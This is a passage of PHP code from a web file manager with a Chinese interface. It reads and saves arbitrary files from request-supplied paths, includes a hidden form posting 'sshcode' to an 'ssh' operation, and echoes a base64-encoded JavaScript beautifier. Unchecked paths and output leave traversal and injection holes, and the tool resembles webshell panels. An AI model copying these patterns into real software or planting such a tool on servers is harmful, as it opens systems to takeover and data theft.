    echo '<form id="ssh" style="display:none;" action="' . $adminfile . '?op=ssh" 
			method="post">
				<textarea id="sshcode" name="sshcode">
				</textarea>
				<input type="submit" />
			</form>';
    echo "<form action=\"" . $adminfile . "?op=save\" method=\"post\" style=\"margin-bottom:0;\">\n" . "<iframe frameborder='3'  scrolling ='no' style='display:none;' id='editor' height='500px' width='1146px' src='". $adminfile ."?op=editor' ></iframe><textarea style='display:block;width: 1146px;height: 504px;' id=\"runbox\"  name=\"ncontent\">\n";
    if (!$fename == "") {
        $handle   = fopen($folder . $fename, "r");
        $contents = "";
        
        while ($x < 1) {
            $data = @fread($handle, filesize($folder . $fename));
            if (strlen($data) == 0) {
                break;
            }
            $contents .= $data;
        }
        fclose($handle);
    }
    $replace1 = "</text";
    $replace2 = "area>";
    $replace3 = "%< / text%";
    $replace4 = "area>";
    $replacea = $replace1 . $replace2;
    $replaceb = $replace3 . $replace4;
    $contents = ereg_replace($replacea, $replaceb, $contents);
    
    echo $contents;
    
    echo "</textarea>\n";
    if (!$fename == "") {
        
        echo "<p>\n" . "<input type=\"hidden\" name=\"folder\" value=\"" . $folder . "\">\n" . "<input type=\"hidden\" name=\"fename\" value=\"" . $fename . "\">\n" . "<input type=\"submit\" onclick=\"gls(0)\" value=\"保存代码\" class=\"button\">&nbsp;\n" . "<button onclick=\"window.location.href='" . $adminfile . "?op=home&folder=" . $folder . "';return false;\">返回目录</button>&nbsp;\n</p>";
    } else {
        echo "<br>\n";
    }
	
    
    
    echo "</form>	<script>";
    echo base64_decode("ZnVuY3Rpb24gQmFzZTY0KCl7X2tleVN0cj0iQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLz0iO3RoaXMuZW5jb2RlPWZ1bmN0aW9uKGlucHV0KXt2YXIgb3V0cHV0PSIiO3ZhciBjaHIxLGNocjIsY2hyMyxlbmMxLGVuYzIsZW5jMyxlbmM0O3ZhciBpPTA7aW5wdXQ9X3V0ZjhfZW5jb2RlKGlucHV0KTt3aGlsZShpPGlucHV0Lmxlbmd0aCl7Y2hyMT1pbnB1dC5jaGFyQ29kZUF0KGkrKyk7Y2hyMj1pbnB1dC5jaGFyQ29kZUF0KGkrKyk7Y2hyMz1pbnB1dC5jaGFyQ29kZUF0KGkrKyk7ZW5jMT1jaHIxPj4yO2VuYzI9KChjaHIxJjMpPDw0KXwoY2hyMj4+NCk7ZW5jMz0oKGNocjImMTUpPDwyKXwoY2hyMz4+Nik7ZW5jND1jaHIzJjYzO2lmKGlzTmFOKGNocjIpKXtlbmMzPWVuYzQ9NjQ7fWVsc2UgaWYoaXNOYU4oY2hyMykpe2VuYzQ9NjQ7fQ0Kb3V0cHV0PW91dHB1dCsNCl9rZXlTdHIuY2hhckF0KGVuYzEpK19rZXlTdHIuY2hhckF0KGVuYzIpKw0KX2tleVN0ci5jaGFyQXQoZW5jMykrX2tleVN0ci5jaGFyQXQoZW5jNCk7fQ0KcmV0dXJuIG91dHB1dDt9DQp0aGlzLmRlY29kZT1mdW5jdGlvbihpbnB1dCl7dmFyIG91dHB1dD0iIjt2YXIgY2hyMSxjaHIyLGNocjM7dmFyIGVuYzEsZW5jMixlbmMzLGVuYzQ7dmFyIGk9MDtpbnB1dD1pbnB1dC5yZXBsYWNlKC9bXkEtWmEtejAtOVwrXC9cPV0vZywiIik7d2hpbGUoaTxpbnB1dC5sZW5ndGgpe2VuYzE9X2tleVN0ci5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtlbmMyPV9rZXlTdHIuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7ZW5jMz1fa2V5U3RyLmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2VuYzQ9X2tleVN0ci5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtjaHIxPShlbmMxPDwyKXwoZW5jMj4+NCk7Y2hyMj0oKGVuYzImMTUpPDw0KXwoZW5jMz4+Mik7Y2hyMz0oKGVuYzMmMyk8PDYpfGVuYzQ7b3V0cHV0PW91dHB1dCtTdHJpbmcuZnJvbUNoYXJDb2RlKGNocjEpO2lmKGVuYzMhPTY0KXtvdXRwdXQ9b3V0cHV0K1N0cmluZy5mcm9tQ2hhckNvZGUoY2hyMik7fQ0KaWYoZW5jNCE9NjQpe291dHB1dD1vdXRwdXQrU3RyaW5nLmZyb21DaGFyQ29kZShjaHIzKTt9fQ0Kb3V0cHV0PV91dGY4X2RlY29kZShvdXRwdXQpO3JldHVybiBvdXRwdXQ7fQ0KX3V0ZjhfZW5jb2RlPWZ1bmN0aW9uKHN0cmluZyl7c3RyaW5nPXN0cmluZy5yZXBsYWNlKC9cclxuL2csIlxuIik7dmFyIHV0ZnRleHQ9IiI7Zm9yKHZhciBuPTA7bjxzdHJpbmcubGVuZ3RoO24rKyl7dmFyIGM9c3RyaW5nLmNoYXJDb2RlQXQobik7aWYoYzwxMjgpe3V0ZnRleHQrPVN0cmluZy5mcm9tQ2hhckNvZGUoYyk7fWVsc2UgaWYoKGM+MTI3KSYmKGM8MjA0OCkpe3V0ZnRleHQrPVN0cmluZy5mcm9tQ2hhckNvZGUoKGM+PjYpfDE5Mik7dXRmdGV4dCs9U3RyaW5nLmZyb21DaGFyQ29kZSgoYyY2Myl8MTI4KTt9ZWxzZXt1dGZ0ZXh0Kz1TdHJpbmcuZnJvbUNoYXJDb2RlKChjPj4xMil8MjI0KTt1dGZ0ZXh0Kz1TdHJpbmcuZnJvbUNoYXJDb2RlKCgoYz4+NikmNjMpfDEyOCk7dXRmdGV4dCs9U3RyaW5nLmZyb21DaGFyQ29kZSgoYyY2Myl8MTI4KTt9fQ0KcmV0dXJuIHV0ZnRleHQ7fQ0KX3V0ZjhfZGVjb2RlPWZ1bmN0aW9uKHV0ZnRleHQpe3ZhciBzdHJpbmc9IiI7dmFyIGk9MDt2YXIgYz1jMT1jMj0wO3doaWxlKGk8dXRmdGV4dC5sZW5ndGgpe2M9dXRmdGV4dC5jaGFyQ29kZUF0KGkpO2lmKGM8MTI4KXtzdHJpbmcrPVN0cmluZy5mcm9tQ2hhckNvZGUoYyk7aSsrO31lbHNlIGlmKChjPjE5MSkmJihjPDIyNCkpe2MyPXV0ZnRleHQuY2hhckNvZGVBdChpKzEpO3N0cmluZys9U3RyaW5nLmZyb21DaGFyQ29kZSgoKGMmMzEpPDw2KXwoYzImNjMpKTtpKz0yO31lbHNle2MyPXV0ZnRleHQuY2hhckNvZGVBdChpKzEpO2MzPXV0ZnRleHQuY2hhckNvZGVBdChpKzIpO3N0cmluZys9U3RyaW5nLmZyb21DaGFyQ29kZSgoKGMmMTUpPDwxMil8KChjMiY2Myk8PDYpfChjMyY2MykpO2krPTM7fX0NCnJldHVybiBzdHJpbmc7fX0NCmZ1bmN0aW9uIHN0eWxlX2h0bWwoaHRtbF9zb3VyY2UsIGluZGVudF9zaXplLCBpbmRlbnRfY2hhcmFjdGVyLCBtYXhfY2hhcikgew0KdmFyIFBhcnNlciwgbXVsdGlfcGFyc2VyOw0KZnVuY3Rpb24gUGFyc2VyKCkgew0KdGhpcy5wb3MgPSAwOyAvL1BhcnNlciBwb3NpdGlvbg0KdGhpcy50b2tlbiA9ICcnOw0KdGhpcy5jdXJyZW50X21vZGUgPSAncnVuYm94JzsgLy9yZWZsZWN0cyB0aGUgY3VycmVudCBQYXJzZXIgbW9kZTogVEFHL0NPTlRFTlQNCnRoaXMudGFncyA9IHsgLy9BbiBvYmplY3QgdG8gaG9sZCB0YWdzLCB0aGVpciBwb3NpdGlvbiwgYW5kIHRoZWlyIHBhcmVudC10YWdzLCBpbml0aWF0ZWQgd2l0aCBkZWZhdWx0IHZhbHVlcw0KcGFyZW50OiAncGFyZW50MScsDQpwYXJlbnRjb3VudDogMSwNCnBhcmVudDE6ICcnDQp9Ow0KdGhpcy50YWdfdHlwZSA9ICcnOw0KdGhpcy50b2tlbl90ZXh0ID0gdGhpcy5sYXN0X3Rva2VuID0gdGhpcy5sYXN0X3RleHQgPSB0aGlzLnRva2VuX3R5cGUgPSAnJzsNCg0KDQp0aGlzLlV0aWxzID0geyAvL1VpbGl0aWVzIG1hZGUgYXZhaWxhYmxlIHRvIHRoZSB2YXJpb3VzIGZ1bmN0aW9ucw0Kd2hpdGVzcGFjZTogIlxuXHJcdCAiLnNwbGl0KCcnKSwNCnNpbmdsZV90b2tlbjogJ2JyLGlucHV0LGxpbmssbWV0YSwhZG9jdHlwZSxiYXNlZm9udCxiYXNlLGFyZWEsaHIsd2JyLHBhcmFtLGltZyxpc2luZGV4LD94bWwsZW1iZWQnLnNwbGl0KCcsJyksIC8vYWxsIHRoZSBzaW5nbGUgdGFncyBmb3IgSFRNTA0KZXh0cmFfbGluZXJzOiAnaGVhZCxib2R5LC9odG1sJy5zcGxpdCgnLCcpLCAvL2ZvciB0YWdzIHRoYXQgbmVlZCBhIGxpbmUgb2Ygd2hpdGVzcGFjZSBiZWZvcmUgdGhlbQ0KaW5fYXJyYXk6IGZ1bmN0aW9uICh3aGF0LCBhcnIpIHsNCmZvciAodmFyIGk9MDsgaTxhcnIubGVuZ3RoOyBpKyspIHsNCmlmICh3aGF0ID09PSBhcnJbaV0pIHsNCnJldHVybiB0cnVlOw0KfQ0KfQ0KcmV0dXJuIGZhbHNlOw0KfQ0KfQ0KDQp0aGlzLmdldF9jb250ZW50ID0gZnVuY3Rpb24gKCkgeyAvL2Z1bmN0aW9uIHRvIGNhcHR1cmUgcmVndWxhciBjb250ZW50IGJldHdlZW4gdGFncw0KDQp2YXIgY2hhciA9ICcnOw0KdmFyIGNvbnRlbnQgPSBbXTsNCnZhciBzcGFjZSA9IGZhbHNlOyAvL2lmIGEgc3BhY2UgaXMgbmVlZGVkDQp3aGlsZSAodGhpcy5pbnB1dC5jaGFyQXQodGhpcy5wb3MpICE9PSAnPCcpIHsNCmlmICh0aGlzLnBvcyA+PSB0aGlzLmlucHV0Lmxlbmd0aCkgew0KcmV0dXJuIGNvbnRlbnQubGVuZ3RoP2NvbnRlbnQuam9pbignJyk6WycnLCAnVEtfRU9GJ107DQp9DQoNCmNoYXIgPSB0aGlzLmlucHV0LmNoYXJBdCh0aGlzLnBvcyk7DQp0aGlzLnBvcysrOw0KdGhpcy5saW5lX2NoYXJfY291bnQrKzsNCg0KDQppZiAodGhpcy5VdGlscy5pbl9hcnJheShjaGFyLCB0aGlzLlV0aWxzLndoaXRlc3BhY2UpKSB7DQppZiAoY29udGVudC5sZW5ndGgpIHsNCnNwYWNlID0gdHJ1ZTsNCn0NCnRoaXMubGluZV9jaGFyX2NvdW50LS07DQpjb250aW51ZTsgLy9kb24ndCB3YW50IHRvIGluc2VydCB1bm5lY2Vzc2FyeSBzcGFjZQ0KfQ0KZWxzZSBpZiAoc3BhY2UpIHsNCmlmICh0aGlzLmxpbmVfY2hhcl9jb3VudCA+PSB0aGlzLm1heF9jaGFyKSB7IC8vaW5zZXJ0IGEgbGluZSB3aGVuIHRoZSBtYXhfY2hhciBpcyByZWFjaGVkDQpjb250ZW50LnB1c2goJ1xuJyk7DQpmb3IgKHZhciBpPTA7IGk8dGhpcy5pbmRlbnRfbGV2ZWw7IGkrKykgew0KY29udGVudC5wdXNoKHRoaXMuaW5kZW50X3N0cmluZyk7DQp9DQp0aGlzLmxpbmVfY2hhcl9jb3VudCA9IDA7DQp9DQplbHNlew0KY29udGVudC5wdXNoKCcgJyk7DQp0aGlzLmxpbmVfY2hhcl9jb3VudCsrOw0KfQ0Kc3BhY2UgPSBmYWxzZTsNCn0NCmNvbnRlbnQucHVzaChjaGFyKTsgLy9sZXR0ZXIgYXQtYS10aW1lIChvciBzdHJpbmcpIGluc2VydGVkIHRvIGFuIGFycmF5DQp9DQpyZXR1cm4gY29udGVudC5sZW5ndGg/Y29udGVudC5qb2luKCcnKTonJzsNCn0NCg0KdGhpcy5nZXRfc2NyaXB0ID0gZnVuY3Rpb24gKCkgeyAvL2dldCB0aGUgZnVsbCBjb250ZW50IG9mIGEgc2NyaXB0IHRvIHBhc3MgdG8ganNfYmVhdXRpZnkNCg0KdmFyIGNoYXIgPSAnJzsNCnZhciBjb250ZW50ID0gW107DQp2YXIgcmVnX21hdGNoID0gbmV3IFJlZ0V4cCgnXDxcL3NjcmlwdCcgKyAnXD4nLCAnaWdtJyk7DQpyZWdfbWF0Y2gubGFzdEluZGV4ID0gdGhpcy5wb3M7DQp2YXIgcmVnX2FycmF5ID0gcmVnX21hdGNoLmV4ZWModGhpcy5pbnB1dCk7DQp2YXIgZW5kX3NjcmlwdCA9IHJlZ19hcnJheT9yZWdfYXJyYXkuaW5kZXg6dGhpcy5pbnB1dC5sZW5ndGg7IC8vYWJzb2x1dGUgZW5kIG9mIHNjcmlwdA0Kd2hpbGUodGhpcy5wb3MgPCBlbmRfc2NyaXB0KSB7IC8vZ2V0IGV2ZXJ5dGhpbmcgaW4gYmV0d2VlbiB0aGUgc2NyaXB0IHRhZ3MNCmlmICh0aGlzLnBvcyA+PSB0aGlzLmlucHV0Lmxlbmd0aCkgew0KcmV0dXJuIGNvbnRlbnQubGVuZ3RoP2NvbnRlbnQuam9pbignJyk6WycnLCAnVEtfRU9GJ107DQp9DQoNCmNoYXIgPSB0aGlzLmlucHV0LmNoYXJBdCh0aGlzLnBvcyk7DQp0aGlzLnBvcysrOw0KDQoNCmNvbnRlbnQucHVzaChjaGFyKTsNCn0NCnJldHVybiBjb250ZW50Lmxlbmd0aD9jb250ZW50LmpvaW4oJycpOicnOyAvL3dlIG1pZ2h0IG5vdCBoYXZlIGFueSBjb250ZW50IGF0IGFsbA0KfQ0KDQp0aGlzLnJlY29yZF90YWcgPSBmdW5jdGlvbiAodGFnKXsgLy9mdW5jdGlvbiB0byByZWNvcmQgYSB0YWcgYW5kIGl0cyBwYXJlbnQgaW4gdGhpcy50YWdzIE9iamVjdA0KaWYgKHRoaXMudGFnc1t0YWcgKyAnY291bnQnXSkgeyAvL2NoZWNrIGZvciB0aGUgZXhpc3RlbmNlIG9mIHRoaXMgdGFnIHR5cGUNCnRoaXMudGFnc1t0YWcgKyAnY291bnQnXSsrOw0KdGhpcy50YWdzW3RhZyArIHRoaXMudGFnc1t0YWcgKyAnY291bnQnXV0gPSB0aGlzLmluZGVudF9sZXZlbDsgLy9hbmQgcmVjb3JkIHRoZSBwcmVzZW50IGluZGVudCBsZXZlbA0KfQ0KZWxzZSB7IC8vb3RoZXJ3aXNlIGluaXRpYWxpemUgdGhpcyB0YWcgdHlwZQ0KdGhpcy50YWdzW3RhZyArICdjb3VudCddID0gMTsNCnRoaXMudGFnc1t0YWcgKyB0aGlzLnRhZ3NbdGFnICsgJ2NvdW50J11dID0gdGhpcy5pbmRlbnRfbGV2ZWw7IC8vYW5kIHJlY29yZCB0aGUgcHJlc2VudCBpbmRlbnQgbGV2ZWwNCn0NCnRoaXMudGFnc1t0YWcgKyB0aGlzLnRhZ3NbdGFnICsgJ2NvdW50J10gKyAncGFyZW50J10gPSB0aGlzLnRhZ3MucGFyZW50OyAvL3NldCB0aGUgcGFyZW50IChpLmUuIGluIHRoZSBjYXNlIG9mIGEgZGl2IHRoaXMudGFncy5kaXYxcGFyZW50KQ0KdGhpcy50YWdzLnBhcmVudCA9IHRhZyArIHRoaXMudGFnc1t0YWcgKyAnY291bnQnXTsgLy9hbmQgbWFrZSB0aGlzIHRoZSBjdXJyZW50IHBhcmVudCAoaS5lLiBpbiB0aGUgY2FzZSBvZiBhIGRpdiAnZGl2MScpDQp9DQoNCnRoaXMucmV0cmlldmVfdGFnID0gZnVuY3Rpb24gKHRhZykgeyAvL2Z1bmN0aW9uIHRvIHJldHJpZXZlIHRoZSBvcGVuaW5nIHRhZyB0byB0aGUgY29ycmVzcG9uZGluZyBjbG9zZXINCmlmICh0aGlzLnRhZ3NbdGFnICsgJ2NvdW50J10pIHsgLy9pZiB0aGUgb3BlbmVuZXIgaXMgbm90IGluIHRoZSBPYmplY3Qgd2UgaWdub3JlIGl0DQp2YXIgdGVtcF9wYXJlbnQgPSB0aGlzLnRhZ3MucGFyZW50OyAvL2NoZWNrIHRvIHNlZSBpZiBpdCdzIGEgY2xvc2FibGUgdGFnLg0Kd2hpbGUgKHRlbXBfcGFyZW50KSB7IC8vdGlsbCB3ZSByZWFjaCAnJyAodGhlIGluaXRpYWwgdmFsdWUpOw0KaWYgKHRhZyArIHRoaXMudGFnc1t0YWcgKyAnY291bnQnXSA9PT0gdGVtcF9wYXJlbnQpIHsgLy9pZiB0aGlzIGlzIGl0IHVzZSBpdA0KYnJlYWs7DQp9DQp0ZW1wX3BhcmVudCA9IHRoaXMudGFnc1t0ZW1wX3BhcmVudCArICdwYXJlbnQnXTsgLy9vdGhlcndpc2Uga2VlcCBvbiBjbGltYmluZyB1cCB0aGUgRE9NIFRyZWUNCn0NCmlmICh0ZW1wX3BhcmVudCkgeyAvL2lmIHdlIGNhdWdodCBzb21ldGhpbmcNCnRoaXMuaW5kZW50X2xldmVsID0gdGhpcy50YWdzW3RhZyArIHRoaXMudGFnc1t0YWcgKyAnY291bnQnXV07IC8vc2V0IHRoZSBpbmRlbnRfbGV2ZWwgYWNjb3JkaW5nbHkNCnRoaXMudGFncy5wYXJlbnQgPSB0aGlzLnRhZ3NbdGVtcF9wYXJlbnQgKyAncGFyZW50J107IC8vYW5kIHNldCB0aGUgY3VycmVudCBwYXJlbnQNCn0NCmRlbGV0ZSB0aGlzLnRhZ3NbdGFnICsgdGhpcy50YWdzW3RhZyArICdjb3VudCddICsgJ3BhcmVudCddOyAvL2RlbGV0ZSB0aGUgY2xvc2VkIHRhZ3MgcGFyZW50IHJlZmVyZW5jZS4uLg0KZGVsZXRlIHRoaXMudGFnc1t0YWcgKyB0aGlzLnRhZ3NbdGFnICsgJ2NvdW50J11dOyAvLy4uLmFuZCB0aGUgdGFnIGl0c2VsZg0KaWYgKHRoaXMudGFnc1t0YWcgKyAnY291bnQnXSA9PSAxKSB7DQpkZWxldGUgdGhpcy50YWdzW3RhZyArICdjb3VudCddOw0KfQ0KZWxzZSB7DQp0aGlzLnRhZ3NbdGFnICsgJ2NvdW50J10tLTsNCn0NCn0NCn0NCg0KdGhpcy5nZXRfdGFnID0gZnVuY3Rpb24gKCkgeyAvL2Z1bmN0aW9uIHRvIGdldCBhIGZ1bGwgdGFnIGFuZCBwYXJzZSBpdHMgdHlwZQ0KdmFyIGNoYXIgPSAnJzsNCnZhciBjb250ZW50ID0gW107DQp2YXIgc3BhY2UgPSBmYWxzZTsNCg0KZG8gew0KaWYgKHRoaXMucG9zID49IHRoaXMuaW5wdXQubGVuZ3RoKSB7DQpyZXR1cm4gY29udGVudC5sZW5ndGg/Y29udGVudC5qb2luKCcnKTpbJycsICdUS19FT0YnXTsNCn0NCg0KY2hhciA9IHRoaXMuaW5wdXQuY2hhckF0KHRoaXMucG9zKTsNCnRoaXMucG9zKys7DQp0aGlzLmxpbmVfY2hhcl9jb3VudCsrOw0KDQppZiAodGhpcy5VdGlscy5pbl9hcnJheShjaGFyLCB0aGlzLlV0aWxzLndoaXRlc3BhY2UpKSB7IC8vZG9uJ3Qgd2FudCB0byBpbnNlcnQgdW5uZWNlc3Nhcnkgc3BhY2UNCnNwYWNlID0gdHJ1ZTsNCnRoaXMubGluZV9jaGFyX2NvdW50LS07DQpjb250aW51ZTsNCn0NCg0KaWYgKGNoYXIgPT09ICInIiB8fCBjaGFyID09PSAnIicpIHsNCmlmICghY29udGVudFsxXSB8fCBjb250ZW50WzFdICE9PSAnIScpIHsgLy9pZiB3ZSdyZSBpbiBhIGNvbW1lbnQgc3RyaW5ncyBkb24ndCBnZXQgdHJlYXRlZCBzcGVjaWFsbHkNCmNoYXIgKz0gdGhpcy5nZXRfdW5mb3JtYXR0ZWQoY2hhcik7DQpzcGFjZSA9IHRydWU7DQp9DQp9DQoNCmlmIChjaGFyID09PSAnPScpIHsgLy9ubyBzcGFjZSBiZWZvcmUgPQ0Kc3BhY2UgPSBmYWxzZTsNCn0NCg0KaWYgKGNvbnRlbnQubGVuZ3RoICYmIGNvbnRlbnRbY29udGVudC5sZW5ndGgtMV0gIT09ICc9JyAmJiBjaGFyICE9PSAnPicNCiYmIHNwYWNlKSB7IC8vbm8gc3BhY2UgYWZ0ZXIgPSBvciBiZWZvcmUgPg0KaWYgKHRoaXMubGluZV9jaGFyX2NvdW50ID49IHRoaXMubWF4X2NoYXIpIHsNCnRoaXMucHJpbnRfbmV3bGluZShmYWxzZSwgY29udGVudCk7DQp0aGlzLmxpbmVfY2hhcl9jb3VudCA9IDA7DQp9DQplbHNlIHsNCmNvbnRlbnQucHVzaCgnICcpOw0KdGhpcy5saW5lX2NoYXJfY291bnQrKzsNCn0NCnNwYWNlID0gZmFsc2U7DQp9DQpjb250ZW50LnB1c2goY2hhcik7IC8vaW5zZXJ0cyBjaGFyYWN0ZXIgYXQtYS10aW1lIChvciBzdHJpbmcpDQp9IHdoaWxlIChjaGFyICE9PSAnPicpOw0KDQp2YXIgdGFnX2NvbXBsZXRlID0gY29udGVudC5qb2luKCcnKTsNCnZhciB0YWdfaW5kZXg7DQppZiAodGFnX2NvbXBsZXRlLmluZGV4T2YoJyAnKSAhPSAtMSkgeyAvL2lmIHRoZXJlJ3Mgd2hpdGVzcGFjZSwgdGhhdHMgd2hlcmUgdGhlIHRhZyBuYW1lIGVuZHMNCnRhZ19pbmRleCA9IHRhZ19jb21wbGV0ZS5pbmRleE9mKCcgJyk7DQp9DQplbHNlIHsgLy9vdGhlcndpc2UgZ28gd2l0aCB0aGUgdGFnIGVuZGluZw0KdGFnX2luZGV4ID0gdGFnX2NvbXBsZXRlLmluZGV4T2YoJz4nKTsNCn0NCnZhciB0YWdfY2hlY2sgPSB0YWdfY29tcGxldGUuc3Vic3RyaW5nKDEsIHRhZ19pbmRleCkudG9Mb3dlckNhc2UoKTsNCmlmICh0YWdfY29tcGxldGUuY2hhckF0KHRhZ19jb21wbGV0ZS5sZW5ndGgtMikgPT09ICcvJyB8fA0KdGhpcy5VdGlscy5pbl9hcnJheSh0YWdfY2hlY2ssIHRoaXMuVXRpbHMuc2luZ2xlX3Rva2VuKSkgeyAvL2lmIHRoaXMgdGFnIG5hbWUgaXMgYSBzaW5nbGUgdGFnIHR5cGUgKGVpdGhlciBpbiB0aGUgbGlzdCBvciBoYXMgYSBjbG9zaW5nIC8pDQp0aGlzLnRhZ190eXBlID0gJ1NJTkdMRSc7DQp9DQplbHNlIGlmICh0YWdfY2hlY2sgPT09ICdzY3JpcHQnKSB7IC8vZm9yIGxhdGVyIHNjcmlwdCBoYW5kbGluZw0KdGhpcy5yZWNvcmRfdGFnKHRhZ19jaGVjayk7DQp0aGlzLnRhZ190eXBlID0gJ1NDUklQVCc7DQp9DQplbHNlIGlmICh0YWdfY2hlY2sgPT09ICdzdHlsZScpIHsgLy9mb3IgZnV0dXJlIHN0eWxlIGhhbmRsaW5nIChmb3Igbm93IGl0IGp1c3RzIHVzZXMgZ2V0X2NvbnRlbnQpDQp0aGlzLnJlY29yZF90YWcodGFnX2NoZWNrKTsNCnRoaXMudGFnX3R5cGUgPSAnU1RZTEUnOw0KfQ0KZWxzZSBpZiAodGFnX2NoZWNrLmNoYXJBdCgwKSA9PT0gJyEnKSB7IC8vcGVlayBmb3IgPCEtLSBjb21tZW50DQppZiAodGFnX2NoZWNrLmluZGV4T2YoJ1tpZicpICE9IC0xKSB7IC8vcGVlayBmb3IgPCEtLVtpZiBjb25kaXRpb25hbCBjb21tZW50DQppZiAodGFnX2NvbXBsZXRlLmluZGV4T2YoJyFJRScpICE9IC0xKSB7IC8vdGhpcyB0eXBlIG5lZWRzIGEgY2xvc2luZyAtLT4gc28uLi4NCnZhciBjb21tZW50ID0gdGhpcy5nZXRfdW5mb3JtYXR0ZWQoJy0tPicsIHRhZ19jb21wbGV0ZSk7IC8vLi4uZGVsZWdhdGUgdG8gZ2V0X3VuZm9ybWF0dGVkDQpjb250ZW50LnB1c2goY29tbWVudCk7DQp9DQp0aGlzLnRhZ190eXBlID0gJ1NUQVJUJzsNCn0NCmVsc2UgaWYgKHRhZ19jaGVjay5pbmRleE9mKCdbZW5kaWYnKSAhPSAtMSkgey8vcGVlayBmb3IgPCEtLVtlbmRpZiBlbmQgY29uZGl0aW9uYWwgY29tbWVudA0KdGhpcy50YWdfdHlwZSA9ICdFTkQnOw0KdGhpcy51bmluZGVudCgpOw0KfQ0KZWxzZSBpZiAodGFnX2NoZWNrLmluZGV4T2YoJ1tjZGF0YVsnKSAhPSAtMSkgeyAvL2lmIGl0J3MgYSA8W2NkYXRhWyBjb21tZW50Li4uDQp2YXIgY29tbWVudCA9IHRoaXMuZ2V0X3VuZm9ybWF0dGVkKCddXT4nLCB0YWdfY29tcGxldGUpOyAvLy4uLmRlbGVnYXRlIHRvIGdldF91bmZvcm1hdHRlZCBmdW5jdGlvbg0KY29udGVudC5wdXNoKGNvbW1lbnQpOw0KdGhpcy50YWdfdHlwZSA9ICdTSU5HTEUnOyAvLzwhW0NEQVRBWyBjb21tZW50cyBhcmUgdHJlYXRlZCBsaWtlIHNpbmdsZSB0YWdzDQp9DQplbHNlIHsNCnZhciBjb21tZW50ID0gdGhpcy5nZXRfdW5mb3JtYXR0ZWQoJy0tPicsIHRhZ19jb21wbGV0ZSk7DQpjb250ZW50LnB1c2goY29tbWVudCk7DQp0aGlzLnRhZ190eXBlID0gJ1NJTkdMRSc7DQp9DQp9DQplbHNlIHsNCmlmICh0YWdfY2hlY2suY2hhckF0KDApID09PSAnLycpIHsgLy90aGlzIHRhZyBpcyBhIGRvdWJsZSB0YWcgc28gY2hlY2sgZm9yIHRhZy1lbmRpbmcNCnRoaXMucmV0cmlldmVfdGFnKHRhZ19jaGVjay5zdWJzdHJpbmcoMSkpOyAvL3JlbW92ZSBpdCBhbmQgYWxsIGFuY2VzdG9ycw0KdGhpcy50YWdfdHlwZSA9ICdFTkQnOw0KfQ0KZWxzZSB7IC8vb3RoZXJ3aXNlIGl0J3MgYSBzdGFydC10YWcNCnRoaXMucmVjb3JkX3RhZyh0YWdfY2hlY2spOyAvL3B1c2ggaXQgb24gdGhlIHRhZyBzdGFjaw0KdGhpcy50YWdfdHlwZSA9ICdTVEFSVCc7DQp9DQppZiAodGhpcy5VdGlscy5pbl9hcnJheSh0YWdfY2hlY2ssIHRoaXMuVXRpbHMuZXh0cmFfbGluZXJzKSkgeyAvL2NoZWNrIGlmIHRoaXMgZG91YmxlIG5lZWRzIGFuIGV4dHJhIGxpbmUNCnRoaXMucHJpbnRfbmV3bGluZSh0cnVlLCB0aGlzLm91dHB1dCk7DQp9DQp9DQpyZXR1cm4gY29udGVudC5qb2luKCcnKTsgLy9yZXR1cm5zIGZ1bGx5IGZvcm1hdHRlZCB0YWcNCn0NCg0KdGhpcy5nZXRfdW5mb3JtYXR0ZWQgPSBmdW5jdGlvbiAoZGVsaW1pdGVyLCBvcmlnX3RhZykgeyAvL2Z1bmN0aW9uIHRvIHJldHVybiB1bmZvcm1hdHRlZCBjb250ZW50IGluIGl0cyBlbnRpcmV0eQ0KDQppZiAob3JpZ190YWcgJiYgb3JpZ190YWcuaW5kZXhPZihkZWxpbWl0ZXIpICE9IC0xKSB7DQpyZXR1cm4gJyc7DQp9DQp2YXIgY2hhciA9ICcnOw0KdmFyIGNvbnRlbnQgPSAnJzsNCnZhciBzcGFjZSA9IHRydWU7DQpkbyB7DQoNCg0KY2hhciA9IHRoaXMuaW5wdXQuY2hhckF0KHRoaXMucG9zKTsNCnRoaXMucG9zKysNCg0KaWYgKHRoaXMuVXRpbHMuaW5fYXJyYXkoY2hhciwgdGhpcy5VdGlscy53aGl0ZXNwYWNlKSkgew0KaWYgKCFzcGFjZSkgew0KdGhpcy5saW5lX2NoYXJfY291bnQtLTsNCmNvbnRpbnVlOw0KfQ0KaWYgKGNoYXIgPT09ICdcbicgfHwgY2hhciA9PT0gJ1xyJykgew0KY29udGVudCArPSAnXG4nOw0KZm9yICh2YXIgaT0wOyBpPHRoaXMuaW5kZW50X2xldmVsOyBpKyspIHsNCmNvbnRlbnQgKz0gdGhpcy5pbmRlbnRfc3RyaW5nOw0KfQ0Kc3BhY2UgPSBmYWxzZTsgLy8uLi5hbmQgbWFrZSBzdXJlIG90aGVyIGluZGVudGF0aW9uIGlzIGVyYXNlZA0KdGhpcy5saW5lX2NoYXJfY291bnQgPSAwOw0KY29udGludWU7DQp9DQp9DQpjb250ZW50ICs9IGNoYXI7DQp0aGlzLmxpbmVfY2hhcl9jb3VudCsrOw0Kc3BhY2UgPSB0cnVlOw0KDQoNCn0gd2hpbGUgKGNvbnRlbnQuaW5kZXhPZihkZWxpbWl0ZXIpID09IC0xKTsNCnJldHVybiBjb250ZW50Ow0KfQ0KDQp0aGlzLmdldF90b2tlbiA9IGZ1bmN0aW9uICgpIHsgLy9pbml0aWFsIGhhbmRsZXIgZm9yIHRva2VuLXJldHJpZXZhbA0KdmFyIHRva2VuOw0KDQppZiAodGhpcy5sYXN0X3Rva2VuID09PSAnVEtfVEFHX1NDUklQVCcpIHsgLy9jaGVjayBpZiB3ZSBuZWVkIHRvIGZvcm1hdCBqYXZhc2NyaXB0DQp2YXIgdGVtcF90b2tlbiA9IHRoaXMuZ2V0X3NjcmlwdCgpOw0KaWYgKHR5cGVvZiB0ZW1wX3Rva2VuICE9PSAnc3RyaW5nJykgew0KcmV0dXJuIHRlbXBfdG9rZW47DQp9DQp0b2tlbiA9IGpzX2JlYXV0aWZ5KHRlbXBfdG9rZW4sIHRoaXMuaW5kZW50X3NpemUsIHRoaXMuaW5kZW50X2NoYXJhY3RlciwgdGhpcy5pbmRlbnRfbGV2ZW